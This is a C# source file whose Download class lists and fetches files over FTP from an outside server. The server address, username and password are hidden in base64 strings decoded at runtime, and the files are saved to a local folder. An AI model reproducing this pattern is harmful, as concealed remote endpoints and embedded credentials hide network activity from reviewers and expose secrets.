using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Text;


namespace crisis
{
    public class Download
    {
        public Download()
        {
        }


        public List<string> GetFileList()
        {
            List<string> downloadFiles;
            StringBuilder result = new StringBuilder();
            WebResponse response = null;
            StreamReader reader = null;
            try
            {
                FtpWebRequest reqFTP;
                reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZnRwOi8vbW9uZXNwYWNlaW50ZXJuZXQubmV0ODQubmV0L3B1YmxpY19odG1sL2RpY3Rpb25hcnkv"))));
                reqFTP.UseBinary = true;
                reqFTP.Credentials = new NetworkCredential(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("YTgxNjc3NTU=")), System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("cEUybE9SSmtxbVJH")));
                reqFTP.Method = WebRequestMethods.Ftp.ListDirectory;
                reqFTP.Proxy = null;
                reqFTP.KeepAlive = false;
                reqFTP.UsePassive = false;
                response = reqFTP.GetResponse();
                reader = new StreamReader(response.GetResponseStream());
                string line = reader.ReadLine();
                while (line != null)
                {
                    result.Append(line);
                    result.Append("\n");
                    line = reader.ReadLine();
                }
                // to remove the trailing '\n'
                result.Remove(result.ToString().LastIndexOf('\n'), 1);
                
                return result.ToString().Split('\n').ToList();
            }
            catch (Exception ex)
            {
                if (reader != null)
                {
                    reader.Close();
                }
                if (response != null)
                {
                    response.Close();
                }
                downloadFiles = null;
                return downloadFiles;
            }
        }

        internal void  StartDownload(string file)
        {                       
             try
            {
                string uri = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZnRwOi8vbW9uZXNwYWNlaW50ZXJuZXQubmV0ODQubmV0L3B1YmxpY19odG1sL2RpY3Rpb25hcnkv")) +file;
                Uri serverUri = new Uri(uri);
                if (serverUri.Scheme != Uri.UriSchemeFtp)
                {
                    return;
                }       
                FtpWebRequest reqFTP;
                reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZnRwOi8vbW9uZXNwYWNlaW50ZXJuZXQubmV0ODQubmV0L3B1YmxpY19odG1sL2RpY3Rpb25hcnkv")) + file));
                reqFTP.Credentials = new NetworkCredential(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("YTgxNjc3NTU=")), System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("cEUybE9SSmtxbVJH")));                
                reqFTP.KeepAlive = false;                
                reqFTP.Method = WebRequestMethods.Ftp.DownloadFile;                                
                reqFTP.UseBinary = true;
                reqFTP.Proxy = null;                 
                reqFTP.UsePassive = false;
                FtpWebResponse response = (FtpWebResponse)reqFTP.GetResponse();
                Stream responseStream = response.GetResponseStream();
                FileStream writeStream = new FileStream(FilesNameDirectory.FilePath[1] + @"\" + file, FileMode.Create);                
                int Length = 2048;
                Byte[] buffer = new Byte[Length];
                int bytesRead = responseStream.Read(buffer, 0, Length);               
                while (bytesRead > 0)
                {
                    writeStream.Write(buffer, 0, bytesRead);
                    bytesRead = responseStream.Read(buffer, 0, Length);
                }                
                writeStream.Close();
                response.Close(); 
            }
            catch (WebException wEx)
            {
                Console.WriteLine( wEx.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine( ex.Message);
            }
        }

        
    }
}
